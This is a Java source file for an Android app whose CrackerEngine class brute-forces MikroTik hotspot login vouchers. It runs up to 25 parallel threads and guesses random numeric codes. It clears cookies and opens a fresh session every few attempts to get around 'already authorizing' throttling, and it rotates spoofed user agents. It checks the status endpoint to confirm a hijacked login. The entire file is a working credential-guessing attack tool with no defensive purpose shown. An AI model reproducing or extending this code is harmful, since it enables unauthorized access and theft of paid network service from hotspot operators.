package com.example.mikrotikbrowser;

import android.content.SharedPreferences;
import java.io.IOException;
import java.util.*;
import java.util.concurrent.atomic.*;
import okhttp3.*;
import org.json.JSONObject;

public class CrackerEngine {
    public interface Listener {
        void onLog(String msg);
        void onProgress(int cur, int total, String voucher);
        void onFound(String voucher, String status);
    }

    private static final int ATTEMPTS_PER_SESSION = 4;
    
    private final Listener listener;
    private final SharedPreferences prefs;
    private final String network;
    private final String loginUrl, statusUrl, baseUrl;
    private final String prefix, suffix;
    private final int digits, maxAttempts, threads;
    private final int pauseMs, retryDelay;

    private final AtomicBoolean stopped = new AtomicBoolean(false);
    private final AtomicBoolean found = new AtomicBoolean(false);
    private final AtomicInteger done = new AtomicInteger(0);
    private final Set<String> tried;
    private final Random rng = new Random();
    private final List<Thread> workers = new ArrayList<>();

    public CrackerEngine(Listener l, SharedPreferences p, String network,
                         String loginUrl, String prefix, String suffix, int digits,
                         int maxAttempts, int threads, int pauseMs, int retryDelay) {
        this.listener = l; this.prefs = p; this.network = network;
        this.loginUrl = loginUrl;
        try {
            this.baseUrl = new java.net.URL(loginUrl).getProtocol() + "://" + new java.net.URL(loginUrl).getHost();
        } catch (Exception e) { throw new RuntimeException("bad url"); }
        this.statusUrl = baseUrl + "/status?var=callBack";
        this.prefix = prefix != null ? prefix : "";
        this.suffix = suffix != null ? suffix : "";
        this.digits = digits; this.maxAttempts = maxAttempts;
        this.threads = Math.max(1, Math.min(threads, 25)); // زيادة الحد الأقصى للخيوط
        this.pauseMs = Math.max(0, pauseMs); // السماح بالتأخير الصفري
        this.retryDelay = retryDelay;
        this.tried = Collections.synchronizedSet(loadTried());
    }

    private Set<String> loadTried() {
        Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
        if (s.size() > 50000) {
            List<String> l = new ArrayList<>(s);
            s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
        }
        return s;
    }

    public void stop() {
        stopped.set(true);
        synchronized (workers) {
            for (Thread t : workers) if (t != null) t.interrupt();
        }
    }

    public void start() {
        new Thread(this::runEngine, "CrackerMain").start();
    }

    private void runEngine() {
        try {
            log("▶ بدء التخمين فائق السرعة (OkHttp)");
            log("  الخيوط: " + threads + " | التأخير: " + pauseMs + "ms");

            log("→ تسجيل خروج...");
            try {
                OkHttpClient temp = new OkHttpClient();
                Request r = new Request.Builder().url(baseUrl + "/logout?erase-cookie=yes&var=callBack").build();
                temp.newCall(r).execute().close();
            } catch (Exception e) {}
            sleep(1000);

            log("  أرقام مجربة سابقاً: " + tried.size());

            synchronized (workers) {
                workers.clear();
                for (int i = 0; i < threads; i++) {
                    final int wid = i;
                    Thread t = new Thread(() -> workerLoop(wid), "Worker-" + wid);
                    workers.add(t);
                    t.start();
                    sleep(50); // تشغيل سريع للخيوط
                }
            }
            log("✓ يعمل الآن " + threads + " خيوط...");

            for (Thread t : new ArrayList<>(workers)) {
                try { t.join(); } catch (Exception e) {}
            }

            if (!found.get() && !stopped.get())
                log("❌ انتهى — " + done.get() + " محاولة");
        } catch (Exception e) {
            log("❌ خطأ: " + e.getMessage());
        }
    }

    private void workerLoop(int id) {
        // كل خيط يمتلك OkHttpClient خاص به (لضمان جلسات منفصلة وسرعة قصوى)
        OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();

        while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
            // جلسة جديدة: مسح الكوكيز السابقة
            client.cookieJar().evictAll();
            
            Map<String, String> template = openSession(client, id);
            if (template == null) {
                sleep(500);
                continue;
            }

            for (int i = 0; i < ATTEMPTS_PER_SESSION && !stopped.get() && !found.get(); i++) {
                if (done.get() >= maxAttempts) return;
                
                String v = generate();
                if (v == null) return;
                
                int cur = done.incrementAndGet();
                listener.onProgress(cur, maxAttempts, v);
                log("[W" + id + "] 🔍 " + v);
                
                Result r = tryLogin(client, template, v);
                if (stopped.get() || found.get()) return;
                
                if (r.busy) {
                    log("[W" + id + "]   ⏳ مشغول — تبديل الجلسة");
                    sleep(retryDelay);
                    break;
                }
                
                if (r.success) {
                    found.set(true);
                    log("[W" + id + "] ✅✅✅ " + v);
                    listener.onFound(v, r.statusJson);
                    return;
                }
                
                if (r.error != null && !r.error.equals("stopped")) {
                    log("[W" + id + "]   ❌ " + r.error);
                }
                
                if (pauseMs > 0) sleep(pauseMs);
            }
            
            if (pauseMs > 0) sleep(100);
        }
    }

    private Map<String, String> openSession(OkHttpClient client, int wid) {
        if (stopped.get()) return null;
        try {
            Request req = new Request.Builder()
                    .url(loginUrl)
                    .header("User-Agent", ua())
                    .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
                    .build();
            try (Response res = client.newCall(req).execute()) {
                if (res.body() == null) return null;
                String html = res.body().string();
                return extractFields(html, wid);
            }
        } catch (Exception e) {
            if (!stopped.get()) log("[W" + wid + "] ⚠ خطأ اتصال: " + e.getMessage());
            return null;
        }
    }

    private Map<String, String> extractFields(String html, int wid) {
        Map<String, String> fields = new LinkedHashMap<>();
        java.util.regex.Pattern p = java.util.regex.Pattern.compile(
                "<input[^>]*name=[\"']([^\"']+)[\"'][^>]*(?:value=[\"']([^\"']*)[\"'])?",
                java.util.regex.Pattern.CASE_INSENSITIVE);
        java.util.regex.Matcher m = p.matcher(html);
        while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
        
        if (fields.isEmpty()) {
            fields.put("username", "");
            fields.put("password", "");
            fields.put("dst", baseUrl + "/");
            fields.put("popup", "true");
        } else {
            fields.putIfAbsent("username", "");
            fields.putIfAbsent("password", "");
            fields.putIfAbsent("dst", baseUrl + "/");
        }
        return fields;
    }

    private Result tryLogin(OkHttpClient client, Map<String, String> template, String voucher) {
        if (stopped.get()) return Result.bad("stopped");
        try {
            FormBody.Builder formBuilder = new FormBody.Builder();
            for (Map.Entry<String, String> e : template.entrySet()) {
                formBuilder.add(e.getKey(), e.getValue());
            }
            formBuilder.add("username", voucher);
            formBuilder.add("password", "");

            Request req = new Request.Builder()
                    .url(loginUrl)
                    .post(formBuilder.build())
                    .header("User-Agent", ua())
                    .header("Referer", loginUrl)
                    .header("Origin", baseUrl)
                    .build();

            try (Response res = client.newCall(req).execute()) {
                if (res.body() == null) return Result.bad("empty body");
                String body = res.body().string();
                String low = body.toLowerCase();

                if (low.contains("already authorizing")) return Result.busy("already authorizing");
                if (low.contains("invalid") || low.contains("error") || low.contains("wrong") || low.contains("denied"))
                    return Result.bad("خاطئ");

                // التحقق فقط إذا لم يكن هناك خطأ صريح
                sleep(50);
                Request statReq = new Request.Builder()
                        .url(statusUrl)
                        .header("User-Agent", ua())
                        .build();
                try (Response statRes = client.newCall(statReq).execute()) {
                    if (statRes.body() != null) {
                        String statusBody = statRes.body().string();
                        JSONObject o = new JSONObject(statusBody);
                        String li = o.optString("logged_in", "").toLowerCase();
                        String un = o.optString("username", "").trim();
                        if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
                            return Result.ok(statusBody);
                    }
                }
                return Result.bad(null);
            }
        } catch (Exception e) {
            return Result.bad("network: " + e.getMessage());
        }
    }

    private static class Result {
        boolean success, busy; String error; String statusJson;
        static Result ok(String j) { Result r = new Result(); r.success = true; r.statusJson = j; return r; }
        static Result bad(String e) { Result r = new Result(); r.error = e; return r; }
        static Result busy(String e) { Result r = new Result(); r.busy = true; r.error = e; return r; }
    }

    private String generate() {
        int max = (int) Math.pow(10, digits) - 1;
        for (int k = 0; k < 500; k++) {
            int num = rng.nextInt(max + 1);
            String v = prefix + String.format(java.util.Locale.US, "%0" + digits + "d", num) + suffix;
            if (tried.add(v)) {
                synchronized (prefs) {
                    Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
                    s.add(v);
                    if (s.size() > 50000) {
                        List<String> l = new ArrayList<>(s);
                        s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
                    }
                    prefs.edit().putStringSet("tried_" + network, s).apply();
                }
                return v;
            }
        }
        return null;
    }

    private String ua() {
        String[] a = {
                "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36"
        };
        return a[rng.nextInt(a.length)];
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
    private void log(String m) { listener.onLog(m); }
}
